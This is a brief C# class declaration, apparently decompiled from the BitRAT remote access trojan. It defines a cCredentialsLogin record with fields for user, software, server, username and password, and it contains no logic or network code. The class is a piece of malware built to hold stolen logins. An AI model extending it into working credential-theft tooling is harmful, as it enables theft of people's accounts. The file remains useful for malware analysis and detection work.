﻿namespace BitRAT
{
    using System;

    public class cCredentialsLogin
    {
        public string[] idxValues;
        public string Key;
        private string m_user;
        private string m_type;
        private string m_software;
        private string m_username;
        private string m_password;
        private string m_tag;

        public cCredentialsLogin();

        public string USER { get; set; }

        public string TYPE { get; set; }

        public string SOFTWARE { get; set; }

        public string SERVER { get; set; }

        public string USERNAME { get; set; }

        public string PASSWORD { get; set; }
    }
}

